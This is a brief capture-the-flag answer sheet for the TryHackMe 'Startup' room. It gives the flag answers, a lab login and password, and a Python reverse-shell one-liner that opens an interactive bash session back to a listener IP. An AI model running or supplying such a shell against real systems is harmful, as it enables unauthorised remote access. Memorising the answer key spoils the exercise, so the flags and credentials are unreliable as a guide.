# TryHackMe Startup

# Saikat Karmakar | Jan 19:2021

# Task 1 
1. What is the secret spicy soup recipe?
```
love
```
2. What are the contents of user.txt?
```
THM{03ce3d619b80ccbfb3b7fc81e46c0e79}
```
3. What are the contents of root.txt?
```
THM{f963aaa6a430f210222158ae15c3d76d
```



***Notes***

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.4.23.120",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'

```
user = lennie 
pass = c4ntg3t3n0ughsp1c3
```